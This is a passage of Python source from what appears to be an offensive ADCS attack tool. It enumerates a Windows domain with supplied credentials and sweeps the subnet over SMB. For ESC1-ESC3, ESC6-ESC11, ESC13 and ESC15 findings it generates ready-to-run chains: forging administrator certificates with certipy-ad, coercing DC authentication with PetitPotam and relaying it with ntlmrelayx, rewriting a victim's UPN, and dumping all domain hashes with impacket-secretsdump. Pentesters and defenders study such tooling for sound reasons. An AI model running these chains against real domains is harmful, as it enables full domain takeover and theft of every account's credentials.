            ctx["groups"].append(g)

    # Query 2: reverse lookup — groups that list this user as member
    if user_dn:
        reverse_out = run(
            f"ldapsearch -H ldap://{dc_ip} "
            f"-D '{user}@{domain}' -w {pw_quoted} "
            f"-b '{dc_base}' "
            f"'(member={user_dn})' cn 2>/dev/null"
        )
        for match in re.finditer(r'^cn:\s*(.+)$', reverse_out, re.MULTILINE):
            g = match.group(1).strip()
            if g and g not in seen:
                seen.add(g)
                ctx["groups"].append(g)

    ctx["priv_groups"] = [g for g in ctx["groups"]
                          if any(p.lower() in g.lower() for p in PRIV_GROUPS)]
    # is_priv: either explicit priv group OR confirmed Pwn3d! on DC
    ctx["is_priv"] = bool(ctx["priv_groups"]) or ctx["is_admin"]

    if ctx["groups"]:
        info(f"{user} group memberships:", '\n'.join(ctx["groups"]))
        if ctx["priv_groups"]:
            high("Privileged group membership detected",
                 '\n'.join(ctx["priv_groups"]))
        if ctx["is_admin"] and not any("domain admin" in g.lower() for g in ctx["groups"]):
            info("Note — privilege context",
                 f"Pwn3d! confirmed via local Administrators membership on the DC.\n"
                 f"This grants effective DA-level access even without Domain Admins membership.\n"
                 f"ADCS attack paths available in Phase 5.")
    else:
        info(f"{user} — No explicit group memberships (Domain Users via primaryGroupID)")

    if ctx["priv_groups"]:
        pass  # already printed above inline with groups

    # SMB sweep
    subnet = '.'.join(dc_ip.split('.')[:3]) + '.0/24'
    sweep = run(
        f"netexec smb {subnet} -u {user} -p {pw_quoted} 2>/dev/null",
        f"SMB sweep {subnet}"
    )
    ctx["admin_hosts"] = [
        re.search(r'(\d+\.\d+\.\d+\.\d+)', l).group(1)
        for l in sweep.split('\n')
        if "Pwn3d!" in l and re.search(r'(\d+\.\d+\.\d+\.\d+)', l)
    ]
    reachable = [l for l in sweep.split('\n') if "[+]" in l]

    if ctx["admin_hosts"]:
        high(f"Admin access confirmed on {len(ctx['admin_hosts'])} host(s)",
             '\n'.join(ctx["admin_hosts"]))
    elif reachable:
        info(f"SMB access (no admin) on {len(reachable)} host(s)")

    return ctx


# ─────────────────────────────────────────────────────────────
# ADMIN SID RESOLUTION
# Resolves the Domain Administrator SID once, shared across
# all phases so commands contain real SIDs, not placeholders.
# ─────────────────────────────────────────────────────────────

def resolve_admin_sid(user, password, domain, dc_ip):
    """
    Resolve the Administrator account's SID via certipy-ad.
    Returns the SID string, or '<ADMIN_SID>' as fallback placeholder.
    """
    pw_quoted = _shlex_quote(password)
    dc_base = ','.join(f'DC={p}' for p in domain.split('.'))

    sid_out = run(
        f"ldapsearch -H ldap://{dc_ip} "
        f"-D '{user}@{domain}' -w {pw_quoted} "
        f"-b '{dc_base}' "
        f"'(sAMAccountName=Administrator)' objectSid 2>/dev/null",
        "Resolving Administrator SID"
    )

    # ldapsearch returns objectSid in base64 — try certipy instead for clean output
    # certipy-ad account read gives us the SID directly
    certipy_out = run(
        f"certipy-ad account -u {user}@{domain} -p {pw_quoted} "
        f"-dc-ip {dc_ip} -user administrator read 2>/dev/null",
        timeout=20
    )
    sid_m = re.search(r'objectSid\s*:\s*(S-1-[\d\-]+)', certipy_out)
    if sid_m:
        sid = sid_m.group(1).strip()
        ok(f"Administrator SID: {sid}")
        return sid

    # Fallback — try to extract domain SID and append -500
    domain_sid_m = re.search(r'(S-1-5-21-[\d\-]+)-\d+', certipy_out)
    if domain_sid_m:
        sid = f"{domain_sid_m.group(1)}-500"
        ok(f"Administrator SID (inferred): {sid}")
        return sid

    med("Could not resolve Administrator SID automatically",
        "Commands will use placeholder — resolve manually:\n"
        f"  certipy-ad account -u {user}@{domain} -p '...' "
        f"-dc-ip {dc_ip} -user administrator read")
    return "<ADMIN_SID>"


# ─────────────────────────────────────────────────────────────
# PHASE 1 — CA LEVEL
# ─────────────────────────────────────────────────────────────

def phase1_ca_level(user, password, domain, dc_ip, ctx, ca):
    section("PHASE 1 — CA-Level Misconfigurations")

    ca_findings = []

    vuln_out = certipy_find(user, password, domain, dc_ip, vulnerable=True)

    # ── ESC7 ──
    if "ESC7" in vuln_out:
        if ctx["is_priv"] or ctx["is_admin"]:
            crit("ESC7 — Dangerous CA ACL (ManageCA / ManageCertificates)",
                 f"{user} has dangerous rights on the CA.\n"
                 "ManageCA     → add self as officer, enable/disable templates, approve requests\n"
                 "ManageCerts  → approve any pending certificate request\n"
                 "NOTE: The old ESC7→ESC6 path (enabling User Specified SAN) is PATCHED on\n"
                 "modern systems (KB5014754). The viable path is the SubCA chain below.\n"
                 "Attack: add self as officer → request SubCA cert (denied) → force-issue → auth",
                 cmds=[
                     f"# Step 1 — add self as Certificate Officer (ManageCertificates)",
                     f"certipy-ad ca -u {user}@{domain} -p {_shlex_quote(password)} "
                     f"-dc-ip {dc_ip} -ca {ca['name']} -target {ca['dns']} -add-officer {user}",
                     f"# Step 2 — enable SubCA template if not already enabled",
                     f"certipy-ad ca -u {user}@{domain} -p {_shlex_quote(password)} "
                     f"-dc-ip {dc_ip} -ca {ca['name']} -target {ca['dns']} -enable-template SubCA",
                     f"# Step 3 — request SubCA cert (will fail — SAVE THE PRIVATE KEY when prompted)",
                     f"certipy-ad req -u {user}@{domain} -p {_shlex_quote(password)} "
                     f"-dc-ip {dc_ip} -ca {ca['name']} -target {ca['dns']} -template SubCA "
                     f"-upn administrator@{domain} -sid {ctx['admin_sid']}",
                     f"# Step 4 — issue the failed request using the ID from Step 3",
                     f"certipy-ad ca -u {user}@{domain} -p {_shlex_quote(password)} "
                     f"-dc-ip {dc_ip} -ca {ca['name']} -target {ca['dns']} -issue-request <REQUEST_ID>",
                     f"# Step 5 — retrieve the issued certificate",
                     f"certipy-ad req -u {user}@{domain} -p {_shlex_quote(password)} "
                     f"-dc-ip {dc_ip} -ca {ca['name']} -retrieve <REQUEST_ID>",
                     f"# Step 6 — authenticate with the cert → TGT + NT hash",
                     f"certipy-ad auth -pfx administrator.pfx "
                     f"-dc-ip {dc_ip} -domain {domain}",
                     f"# Step 7 — DCSync (dump all domain hashes)",
                     f"export KRB5CCNAME=administrator.ccache",
                     f"impacket-secretsdump -k -no-pass "
                     f"{domain}/administrator@{dc_ip} -just-dc-ntlm",
                     f"# (fallback if Kerberos DCSync fails — use the NT hash from Step 6)",
                     f"impacket-secretsdump {domain}/administrator@{dc_ip} "
                     f"-hashes <LM:NT_HASH_FROM_STEP_6> -just-dc-ntlm",
                     "",
                     f"# ── CLEANUP (run after exploitation) ──",
                     f"# Remove officer rights",
                     f"certipy-ad ca -u {user}@{domain} -p {_shlex_quote(password)} "
                     f"-dc-ip {dc_ip} -ca {ca['name']} -target {ca['dns']} -remove-officer {user}",
                     f"# Disable SubCA template",
                     f"certipy-ad ca -u {user}@{domain} -p {_shlex_quote(password)} "
                     f"-dc-ip {dc_ip} -ca {ca['name']} -target {ca['dns']} -disable-template SubCA",
                     f"# Delete leftover files",
                     f"rm -f administrator.pfx administrator.ccache administrator.crt *.key",
                 ])
        else:
            high("ESC7 — CA ACL misconfiguration detected",
                 f"However {user} does not have sufficient rights to exploit this directly.\n"
                 "A higher-privileged account would be needed to exploit ESC7.")
        ca_findings.append("ESC7")
    else:
        skip("ESC7 — No dangerous CA ACL rights detected")

    # ── ESC6 ──
    if re.search(r'User Specified SAN\s*:\s*Enabled', vuln_out):
        crit("ESC6 — User Specified SAN enabled on CA",
             "IMPORTANT: ESC6 alone is PATCHED on systems with May 2022 updates (KB5014754).\n"
             "On patched systems the CA embeds the requester's real SID, blocking impersonation.\n"
             "ESC6 is viable if:\n"
             "  1. StrongCertificateBindingEnforcement = 0 (unpatched/disabled), OR\n"
             "  2. Combined with ESC9 (CT_FLAG_NO_SECURITY_EXTENSION on template), OR\n"
             "  3. Combined with ESC16 (SID extension disabled CA-wide)\n"
             "Check Phase 2 binding enforcement and Phase 1 ESC9 results.",
             cmds=[
                 f"# ── Only if unpatched (StrongCertificateBindingEnforcement=0) ──",
                 f"# Get admin SID: certipy-ad account -u {user}@{domain} -p {_shlex_quote(password)} "
                 f"-dc-ip {dc_ip} -user administrator read",
                 f"certipy-ad req -u {user}@{domain} -p {_shlex_quote(password)} "
                 f"-dc-ip {dc_ip} -ca {ca['name']} -target {ca['dns']} -template User "
                 f"-upn administrator@{domain} -sid {ctx['admin_sid']}",
                 f"certipy-ad auth -pfx administrator.pfx "
                 f"-dc-ip {dc_ip} -domain {domain}",
                 f"# ── DCSync ──",
                 f"export KRB5CCNAME=administrator.ccache",
                 f"impacket-secretsdump -k -no-pass "
                 f"{domain}/administrator@{dc_ip} -just-dc-ntlm",
                 f"# (fallback — use NT hash from certipy auth output)",
                 f"impacket-secretsdump {domain}/administrator@{dc_ip} "
                 f"-hashes <LM:NT_HASH> -just-dc-ntlm",
             ])
        ca_findings.append("ESC6")
    else:
        skip("ESC6 — User Specified SAN disabled")

    # ── ESC8 ──
    # Certipy v4: "Web Enrollment  : Enabled"
    # Certipy v5: "HTTP\n  Enabled : True" or "Web Enrollment: Enabled"
    esc8_hit = (
        re.search(r'Web Enrollment\s*:\s*Enabled', vuln_out) or
        re.search(r'HTTP\s*\n\s*Enabled\s*:\s*True', vuln_out) or
        re.search(r'HTTPS\s*\n\s*Enabled\s*:\s*True', vuln_out)
    )
    if esc8_hit:
        high("ESC8 — Web Enrollment enabled",
             "NTLM relay to /certsrv/ possible if EPA/channel binding is not enforced.\n"
             "Coerce DC authentication → relay to CA web enrollment → get DC cert → DCSync.",
             cmds=[
                 f"# ── Option 1: certipy relay (Certipy v5+, preferred) ──",
                 f"certipy-ad relay -target http://{ca['dns']} -template DomainController",
                 f"# In another terminal — coerce DC auth:",
                 f"python3 /opt/PetitPotam/PetitPotam.py "
                 f"-u '{user}' -p {_shlex_quote(password)} -d {domain} <KALI_IP> {dc_ip}",
                 f"certipy-ad auth -pfx dc.pfx -dc-ip {dc_ip} -domain {domain}",
                 f"# ── Option 2: impacket-ntlmrelayx (fallback) ──",
                 f"impacket-ntlmrelayx -t http://{ca['dns']}/certsrv/certfnsh.asp "
                 f"--adcs --template DomainController -smb2support",
             ])
        ca_findings.append("ESC8")
    else:
        skip("ESC8 — Web enrollment disabled")

    # ── ESC11 ──
    if re.search(r'Enforce Encryption for Requests\s*:\s*Disabled', vuln_out):
        high("ESC11 — RPC encryption not enforced",
             "NTLM relay to the RPC enrollment endpoint is viable.\n"
             "Similar to ESC8 but over RPC instead of HTTP.",
             cmds=[
                 f"# ── certipy relay over RPC ──",
                 f"certipy-ad relay -target rpc://{ca['dns']} -template DomainController",
                 f"# Coerce DC auth in another terminal:",
                 f"python3 /opt/PetitPotam/PetitPotam.py "
                 f"-u '{user}' -p {_shlex_quote(password)} -d {domain} <KALI_IP> {dc_ip}",
                 f"certipy-ad auth -pfx dc.pfx -dc-ip {dc_ip} -domain {domain}",
                 f"# ── Fallback: impacket-ntlmrelayx ──",
                 f"impacket-ntlmrelayx -t rpc://{ca['dns']} --adcs "
                 f"--template DomainController -smb2support",
             ])
        ca_findings.append("ESC11")
    else:
        skip("ESC11 — Encryption enforced on CA")

    # ── ESC13 ──
    if "ESC13" in vuln_out:
        linked_group = "unknown group"
        linked_template = "unknown template"
        grp_m = re.search(r'Linked Group\s*:\s*(.+)', vuln_out)
        tpl_m = re.search(r'Template Name\s*:\s*(.+)', vuln_out)
        if grp_m:
            linked_group = grp_m.group(1).strip()
        if tpl_m:
            linked_template = tpl_m.group(1).strip()

        crit("ESC13 — Issuance Policy OID linked to privileged group",
             f"Template '{linked_template}' is linked via an issuance policy OID\n"
             f"to group '{linked_group}' via msDS-OIDToGroupLink.\n"
             "Enrolling in the template grants implicit membership in that group\n"
             "for the duration of the session — no direct group membership needed.",
             cmds=[
                 f"# Step 1 — enroll in the linked template",
                 f"certipy-ad req -u {user}@{domain} -p {_shlex_quote(password)} "
                 f"-dc-ip {dc_ip} -ca {ca['name']} -template {linked_template}",
                 f"# Step 2 — authenticate — session will have group privileges",
                 f"certipy-ad auth -pfx {linked_template.lower()}.pfx "
                 f"-dc-ip {dc_ip} -domain {domain}",
             ])
        ca_findings.append("ESC13")
    else:
        skip("ESC13 — No OID-to-group links found")

    # ── ESC9 — CT_FLAG_NO_SECURITY_EXTENSION on template ──
    full_out = certipy_find(user, password, domain, dc_ip, vulnerable=False)
    esc9_templates = []
    blocks = _split_certipy_blocks(full_out)
    for block in blocks:
        tname = _certipy_field(block, 'Template Name')
        if not tname:
            continue
        enabled     = _certipy_field_bool(block, 'Enabled')
        client_auth = _certipy_field_bool(block, 'Client Authentication')

        # CT_FLAG_NO_SECURITY_EXTENSION = 0x00080000 = 524288 decimal
        enroll_flags = _certipy_field(block, 'Enrollment Flag') or ""
        has_no_sec_ext = (
            'NoSecurityExtension' in enroll_flags or
            '524288' in enroll_flags or
            'CT_FLAG_NO_SECURITY_EXTENSION' in enroll_flags
        )
        low_priv = any(g in block for g in LOW_PRIV_ENROLL)
        if enabled and client_auth and has_no_sec_ext and low_priv:
            esc9_templates.append(tname)

    if esc9_templates:
        high("ESC9 — CT_FLAG_NO_SECURITY_EXTENSION on template(s)",
             f"Template(s): {', '.join(esc9_templates)}\n"
             "No SID embedded in cert — exploitable if GenericWrite on any account exists.\n"
             "Combined with ESC10 (weak binding), allows UPN-based impersonation.\n"
             "See Phase 2 for full exploitation chain.",)
        ca_findings.append("ESC9")
    else:
        skip("ESC9 — No templates with CT_FLAG_NO_SECURITY_EXTENSION found")

    # ── ESC15 — Schema v1 + EKU alterable (msPKI-Certificate-Name-Flag) ──
    # ESC15 applies to templates where:
    #   - msPKI-Certificate-Name-Flag includes ENROLLEE_SUPPLIES_SUBJECT
    #   - Schema Version = 1 (allows Application Policy / EKU override in request)
    #   - The template does NOT have Client Auth EKU by default (but attacker adds it)
    # Certipy v5 flags this directly; we also detect it manually.
    esc15_templates = []
    esc15_detected_any = False  # track if any ESC15 found (even admin-only)
    for block in blocks:
        tname = _certipy_field(block, 'Template Name')
        if not tname:
            continue
        enabled       = _certipy_field_bool(block, 'Enabled')
        schema        = _certipy_field_int(block, 'Schema Version', 0)
        enrollee_subj = _certipy_field_bool(block, 'Enrollee Supplies Subject')
        mgr_approval  = _certipy_field_bool(block, 'Requires Manager Approval')
        auth_sigs     = _certipy_field_int(block, 'Authorized Signatures Required', 0)

        # Check Certipy's own ESC15 flag first
        certipy_flagged = 'ESC15' in block

        # Manual detection: Schema v1 + EnrolleeSuppliesSubject + enrollable
        # Schema v1 templates allow the requester to specify Application Policies
        # in the request, effectively overriding EKUs (including adding Client Auth)
        manual_detect = (
            enabled and schema == 1 and enrollee_subj
            and not mgr_approval and auth_sigs == 0
        )

        if not (certipy_flagged or manual_detect):
            continue
        if not enabled:
            continue

        esc15_detected_any = True

        # Check enrollment rights — who can enroll
        low_priv_enroll = any(g in block for g in LOW_PRIV_ENROLL)
        any_enroll = bool(re.search(r'Enrollment Rights\s*:', block))

        if low_priv_enroll:
            crit(f"ESC15 — {tname} (Schema v1 + EKU override)",
                 f"Schema Version 1 template with Enrollee Supplies Subject.\n"
                 "Attacker can specify Application Policies in the CSR to add Client Auth EKU,\n"
                 "even if the template doesn't include it by default.\n"
                 "Combined with SAN control, this allows authentication as any user.",
                 cmds=[
                     f"# Request cert with overridden EKU + SAN",
                     f"certipy-ad req -u {user}@{domain} -p {_shlex_quote(password)} "
                     f"-dc-ip {dc_ip} -ca {ca['name']} -target {ca['dns']} "
                     f"-template {tname} -upn administrator@{domain} -sid {ctx['admin_sid']} "
                     f"-application-policies 1.3.6.1.5.5.7.3.2",
                     f"certipy-ad auth -pfx administrator.pfx "
                     f"-dc-ip {dc_ip} -domain {domain}",
                     f"# ── DCSync ──",
                     f"export KRB5CCNAME=administrator.ccache",
                     f"impacket-secretsdump -k -no-pass "
                     f"{domain}/administrator@{dc_ip} -just-dc-ntlm",
                     f"# (fallback — use NT hash from certipy auth output)",
                     f"impacket-secretsdump {domain}/administrator@{dc_ip} "
                     f"-hashes <LM:NT_HASH> -just-dc-ntlm",
                 ])
            esc15_templates.append(tname)
        elif any_enroll and (ctx["is_priv"] or ctx["is_admin"]):
            high(f"ESC15 — {tname} (Schema v1 + EKU override, priv enrollment)",
                 f"Template is exploitable but enrollment restricted to privileged groups.\n"
                 "Accessible because current user has elevated privileges.",
                 cmds=[
                     f"certipy-ad req -u {user}@{domain} -p {_shlex_quote(password)} "
                     f"-dc-ip {dc_ip} -ca {ca['name']} -target {ca['dns']} "
                     f"-template {tname} -upn administrator@{domain} -sid {ctx['admin_sid']} "
                     f"-application-policies 1.3.6.1.5.5.7.3.2",
                     f"certipy-ad auth -pfx administrator.pfx "
                     f"-dc-ip {dc_ip} -domain {domain}",
                     f"# ── DCSync ──",
                     f"export KRB5CCNAME=administrator.ccache",
                     f"impacket-secretsdump -k -no-pass "
                     f"{domain}/administrator@{dc_ip} -just-dc-ntlm",
                     f"# (fallback — use NT hash from certipy auth output)",
                     f"impacket-secretsdump {domain}/administrator@{dc_ip} "
                     f"-hashes <LM:NT_HASH> -just-dc-ntlm",
                 ])
            esc15_templates.append(tname)
        else:
            info(f"ESC15 — {tname} (Schema v1 + EKU override, admin-only enrollment)",
                 "Template is vulnerable but enrollment restricted to admins.")

    if esc15_templates:
        ca_findings.append("ESC15")
    elif not esc15_detected_any:
        skip("ESC15 — No Schema v1 + EKU-overridable templates found")

    return ca_findings


# ─────────────────────────────────────────────────────────────
# PHASE 2 — BINDING ENFORCEMENT
# ─────────────────────────────────────────────────────────────

def phase2_binding(user, password, domain, dc_ip, ctx, ca):
    section("PHASE 2 — Certificate Binding Enforcement (ESC9 / ESC10)")

    pw_quoted = _shlex_quote(password)

    if ctx["is_admin"] or ctx["is_priv"]:
        skip("Skipped — not relevant for privileged users (direct paths available in Phase 5)")
        return 2, []

    # ── Condition 1 — Registry value ──
    reg_out = run(
        f"netexec smb {dc_ip} -u {user} -p {pw_quoted} "
        f"-x 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kdc "
        f"/v StrongCertificateBindingEnforcement' 2>/dev/null",
        "Checking StrongCertificateBindingEnforcement"
    )

    if "0x2" in reg_out:
        skip("Full enforcement enabled (value=2) — ESC9/ESC10 not applicable")
        return 2, []
    elif "0x0" in reg_out:
        binding_val = 0
        ok("Binding enforcement DISABLED (value=0)",
           "No SID validation — strongest condition for ESC9/ESC10")
    elif "0x1" in reg_out:
        binding_val = 1
        med("Binding enforcement COMPATIBILITY mode (value=1)",
            "Legacy mappings accepted — ESC10 condition met")
    else:
        binding_val = 1
        med("Registry key absent — defaults to compatibility mode (1)",
            "Treated as value=1 for ESC10 assessment")

    # ── Condition 2 — GenericWrite on any user ──
    info("Checking userPrincipalName write access on domain objects (bloodyAD)...")
    writable_out = run(
        bloodyad_cmd(user, password, domain, dc_ip,
                     "get writable --otype USER --attr userPrincipalName 2>/dev/null"),
        "Checking userPrincipalName-writable USER objects"
    )

    writable_out += run(
        bloodyad_cmd(user, password, domain, dc_ip,
                     "get writable --otype COMPUTER --attr userPrincipalName 2>/dev/null"),
        "Checking userPrincipalName-writable COMPUTER objects"
    )

    dc_base = ','.join(f'DC={p}' for p in domain.split('.'))
    writable_targets = []
    writable_dns = re.findall(r'distinguishedName:\s*(CN=[^\n]+)', writable_out)

    for dn in writable_dns:
        cn_m = re.search(r'CN=([^,]+)', dn)
        if not cn_m:
            continue
        cn = cn_m.group(1).strip()

        # Skip self
        if cn.lower().rstrip('$') == user.lower() or cn.lower() == user.lower():
            continue

        # Look up actual sAMAccountName via ldapsearch for accuracy
        sam_out = run(
            f"ldapsearch -H ldap://{dc_ip} "
            f"-D '{user}@{domain}' -w {pw_quoted} "
            f"-b '{dc_base}' "
            f"'(distinguishedName={dn})' sAMAccountName 2>/dev/null"
        )
        sam_m = re.search(r'^sAMAccountName:\s*(.+)$', sam_out, re.MULTILINE)
        if sam_m:
            sam = sam_m.group(1).strip()
            if sam.lower().rstrip('$') != user.lower() and sam.lower() != user.lower():
                writable_targets.append(sam)
        else:
            if cn.lower().rstrip('$') != user.lower():
                writable_targets.append(cn)

    # Deduplicate while preserving order
    writable_targets = list(dict.fromkeys(writable_targets))

    # ── Merge graph-discovered writable targets ──
    # If Neo4j graph analysis found writable users/computers that bloodyAD missed,
    # include them (GenericWrite or GenericAll implies UPN write capability).
    graph_users = ctx.get("graph_writable_users", [])
    graph_comps = ctx.get("graph_writable_computers", [])
    graph_extras = []
    for gt in graph_users + graph_comps:
        # Normalize to sAMAccountName format
        if gt.lower().rstrip('$') != user.lower() and gt not in writable_targets:
            graph_extras.append(gt)
    if graph_extras and not writable_targets:
        info(f"bloodyAD found no writable targets, but graph analysis found {len(graph_extras)}",
             "These were discovered via multi-hop ACL paths in Neo4j.\n"
             "Merging into ESC10 assessment.")
        writable_targets = graph_extras
    elif graph_extras:
        new_from_graph = [g for g in graph_extras if g not in writable_targets]
        if new_from_graph:
            info(f"Graph analysis found {len(new_from_graph)} additional writable target(s)",
                 '\n'.join(new_from_graph))
            writable_targets.extend(new_from_graph)

    if not writable_targets:
        skip("Condition 2 FAILED — No userPrincipalName write access on any accounts\n"
             "       ESC9/ESC10 not exploitable from this position")
        return binding_val, []

    high(f"Condition 2 MET — userPrincipalName write access on {len(writable_targets)} object(s)",
         '\n'.join(writable_targets))

    # ── Condition 3 — Client Auth template enrollable by current user ──
    template_check = certipy_find(user, password, domain, dc_ip, vulnerable=False)
    client_auth_templates = []
    blocks = _split_certipy_blocks(template_check)
    for block in blocks:
        tname = _certipy_field(block, 'Template Name')
        if not tname:
            continue
        enabled     = _certipy_field_bool(block, 'Enabled')
        client_auth = _certipy_field_bool(block, 'Client Authentication')
        low_priv = any(g in block for g in LOW_PRIV_ENROLL)
        if enabled and client_auth and low_priv:
            client_auth_templates.append(tname)

    if not client_auth_templates:
        skip("Condition 3 FAILED — No Client Auth templates enrollable by this user\n"
             "       ESC9/ESC10 not exploitable from this position")
        return binding_val, []

    ok(f"Condition 3 MET — Client Auth template(s) available: {', '.join(client_auth_templates)}")

    # ── All three conditions met — confirmed exploitable ──
    for target in writable_targets:
        template = client_auth_templates[0]
        crit(f"ESC10 CONFIRMED — exploitable via '{target}'",
             f"All three conditions met:\n"
             f"  1. Binding enforcement = {binding_val} (weak)\n"
             f"  2. userPrincipalName write access on '{target}'\n"
             f"  3. Client Auth template '{template}' enrollable\n"
             f"Attack: change {target}'s UPN to match a DA, request cert, restore UPN, auth",
             cmds=[
                 f"# Step 1 — save original UPN for cleanup",
                 f"python3 {BLOODYADPY} -u {user} -p {pw_quoted} "
                 f"-d {domain} --host {dc_ip} "
                 f"get object '{target}' --attr userPrincipalName",
                 f"# Step 2 — set target's UPN to impersonate administrator",
                 f"python3 {BLOODYADPY} -u {user} -p {pw_quoted} "
                 f"-d {domain} --host {dc_ip} "
                 f"set object '{target}' userPrincipalName -v 'administrator'",
                 f"# Step 3 — request cert as target (UPN = administrator)",
                 f"# NOTE: If you have GenericWrite on this account, use the Chain Analysis",
                 f"# section below for a no-password version using NT hash instead.",
                 f"certipy-ad req -u {target}@{domain} -hashes :<NT_HASH> "
                 f"-dc-ip {dc_ip} -ca {ca['name']} -template {template}",
                 f"# (get NT hash via: certipy-ad shadow auto ... -account {target})",
                 f"# Step 4 — restore original UPN (cleanup)",
                 f"python3 {BLOODYADPY} -u {user} -p {pw_quoted} "
                 f"-d {domain} --host {dc_ip} "
                 f"set object '{target}' userPrincipalName "
                 f"-v '{target}@{domain}'",
                 f"# Step 5 — authenticate with the cert",
                 f"certipy-ad auth -pfx administrator.pfx "
                 f"-dc-ip {dc_ip} -domain {domain}",
                 f"# Step 6 — DCSync",
                 f"export KRB5CCNAME=administrator.ccache",
                 f"impacket-secretsdump -k -no-pass "
                 f"{domain}/administrator@{dc_ip} -just-dc-ntlm",
                 f"# (fallback — use NT hash from certipy auth output)",
                 f"impacket-secretsdump {domain}/administrator@{dc_ip} "
                 f"-hashes <LM:NT_HASH> -just-dc-ntlm",
             ])

    return binding_val, writable_targets


# ─────────────────────────────────────────────────────────────
# PHASE 3 — TEMPLATE TRIAGE
# ─────────────────────────────────────────────────────────────

def phase3_templates(user, password, domain, dc_ip, ctx, ca):
    section("PHASE 3 — Template Enumeration & Triage (ESC1–ESC4, ESC15)")

    pw_quoted = _shlex_quote(password)
    netbios = domain.split('.')[0].upper()

    out = certipy_find(user, password, domain, dc_ip, vulnerable=False)

    template_findings = []
    blocks = _split_certipy_blocks(out)

    # Templates handled by Phase 5 — skip in Phase 3
    ENDGAME_TEMPLATES = {"SubCA", "CA"}

    for block in blocks:
        tname = _certipy_field(block, 'Template Name')
        if not tname:
            continue

        if tname in ENDGAME_TEMPLATES:
            continue

        enabled       = _certipy_field_bool(block, 'Enabled')
        client_auth   = _certipy_field_bool(block, 'Client Authentication')
        enrollee_subj = _certipy_field_bool(block, 'Enrollee Supplies Subject')
        any_purpose   = _certipy_field_bool(block, 'Any Purpose')
        enroll_agent  = _certipy_field_bool(block, 'Enrollment Agent')
        mgr_approval  = _certipy_field_bool(block, 'Requires Manager Approval')
        auth_sigs     = _certipy_field_int(block, 'Authorized Signatures Required', 0)
        schema        = _certipy_field_int(block, 'Schema Version', 0)

        if not enabled:
            continue

        # Parse enrollment rights
        enroll_m = re.search(
            r'Enrollment Rights\s*:(.*?)(?=Object Control Permissions|$)',
            block, re.DOTALL
        )
        enroll_text = enroll_m.group(1) if enroll_m else ""

        low_priv_user_enroll = any(g in enroll_text for g in LOW_PRIV_ENROLL)
        low_priv_comp_enroll = any(g in enroll_text for g in LOW_PRIV_COMPUTER)
        enrollable = [g for g in LOW_PRIV_ENROLL + LOW_PRIV_COMPUTER if g in enroll_text]

        user_can_enroll = low_priv_user_enroll or (ctx["is_priv"] and bool(enroll_text.strip()))

        # Parse dangerous write ACLs
        write_acl = False
        acl_m = re.search(
            r'Object Control Permissions(.*?)(?=\n\s+\d+\s*\n|Certificate Templates|\Z)',
            block, re.DOTALL
        )
        if acl_m:
            acl_text = acl_m.group(1)
            for field in DANGEROUS_ACL_FIELDS:
                field_m = re.search(
                    rf'{re.escape(field)}\s*:(.*?)(?=Write|Full Control|Owner|\Z)',
                    acl_text, re.DOTALL
                )
                if field_m:
                    fval = field_m.group(1)
                    if any(g in fval for g in LOW_PRIV_ENROLL):
                        write_acl = True
                        break

        # ── ESC1 (low-priv accessible) ──
        if (client_auth and enrollee_subj and low_priv_user_enroll
                and not mgr_approval and auth_sigs == 0):
            crit(f"ESC1 — {tname}",
                 f"Enrollable by: {', '.join(enrollable)}\n"
                 "Client Auth + EnrolleeSuppliesSubject — any user can request cert with DA UPN",
                 cmds=[
                     f"certipy-ad req -u {user}@{domain} -p {pw_quoted} "
                     f"-dc-ip {dc_ip} -ca {ca['name']} "
                     f"-template {tname} -target {ca['dns']} -upn administrator@{domain} -sid {ctx['admin_sid']}",
                     f"certipy-ad auth -pfx administrator.pfx "
                     f"-dc-ip {dc_ip} -domain {domain}",
                     f"# ── DCSync ──",
                     f"export KRB5CCNAME=administrator.ccache",
                     f"impacket-secretsdump -k -no-pass "
                     f"{domain}/administrator@{dc_ip} -just-dc-ntlm",
                     f"# (fallback — use NT hash from certipy auth output)",
                     f"impacket-secretsdump {domain}/administrator@{dc_ip} "
                     f"-hashes <LM:NT_HASH> -just-dc-ntlm",
                 ])
            template_findings.append(("ESC1", tname))

        # ── ESC2 (low-priv accessible) ──
        elif (any_purpose and low_priv_user_enroll
              and not mgr_approval and auth_sigs == 0):
            crit(f"ESC2 — {tname}",
                 f"Enrollable by: {', '.join(enrollable)}\n"
                 "Any Purpose EKU — usable as enrollment agent for ESC3 chain",
                 cmds=[
                     f"# Step 1 — get Any Purpose cert",
                     f"certipy-ad req -u {user}@{domain} -p {pw_quoted} "
                     f"-dc-ip {dc_ip} -ca {ca['name']} -template {tname}",
                     f"# Step 2 — use to enroll on behalf of DA",
                     f"certipy-ad req -u {user}@{domain} -p {pw_quoted} "
                     f"-dc-ip {dc_ip} -ca {ca['name']} -template User "
                     f"-on-behalf-of '{netbios}\\administrator' -pfx {tname.lower()}.pfx",
                     f"certipy-ad auth -pfx administrator.pfx "
                     f"-dc-ip {dc_ip} -domain {domain}",
                     f"# ── DCSync ──",
                     f"export KRB5CCNAME=administrator.ccache",
                     f"impacket-secretsdump -k -no-pass "
                     f"{domain}/administrator@{dc_ip} -just-dc-ntlm",
                     f"# (fallback — use NT hash from certipy auth output)",
                     f"impacket-secretsdump {domain}/administrator@{dc_ip} "
                     f"-hashes <LM:NT_HASH> -just-dc-ntlm",
                 ])
            template_findings.append(("ESC2", tname))

        # ── ESC3 source (low-priv accessible) ──
        elif (enroll_agent and low_priv_user_enroll
              and not mgr_approval and auth_sigs == 0):
            high(f"ESC3 — Enrollment Agent template: {tname}",
                 f"Enrollable by: {', '.join(enrollable)}\n"
                 "Can enroll on behalf of other users",
                 cmds=[
                     f"# Step 1 — get agent cert",
                     f"certipy-ad req -u {user}@{domain} -p {pw_quoted} "
                     f"-dc-ip {dc_ip} -ca {ca['name']} -template {tname}",
                     f"# Step 2 — enroll as DA",
                     f"certipy-ad req -u {user}@{domain} -p {pw_quoted} "
                     f"-dc-ip {dc_ip} -ca {ca['name']} -template User "
                     f"-on-behalf-of '{netbios}\\administrator' -pfx {tname.lower()}.pfx",
                     f"certipy-ad auth -pfx administrator.pfx "
                     f"-dc-ip {dc_ip} -domain {domain}",
                     f"# ── DCSync ──",
                     f"export KRB5CCNAME=administrator.ccache",
                     f"impacket-secretsdump -k -no-pass "
                     f"{domain}/administrator@{dc_ip} -just-dc-ntlm",
                     f"# (fallback — use NT hash from certipy auth output)",
                     f"impacket-secretsdump {domain}/administrator@{dc_ip} "
                     f"-hashes <LM:NT_HASH> -just-dc-ntlm",
                 ])
            template_findings.append(("ESC3", tname))

